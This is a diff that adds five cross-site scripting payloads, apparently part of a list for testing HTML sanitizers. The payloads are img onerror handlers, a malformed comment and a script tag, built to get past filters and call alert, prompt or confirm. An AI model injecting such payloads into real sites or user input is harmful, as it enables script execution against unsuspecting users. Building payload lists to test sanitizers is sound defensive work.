@@ -1,0 +1,6 @@
+<img src=x onerror=!!!!~~~~~~~alert(origin)>
+<img src="/"=_="title="onerror='prompt(origin)'">
+<--`<img/src=` onerror=alert(origin)> --!>
+<!<script>confirm(origin)</script>
+<img src&#x3E onerror=alert(1)>
+
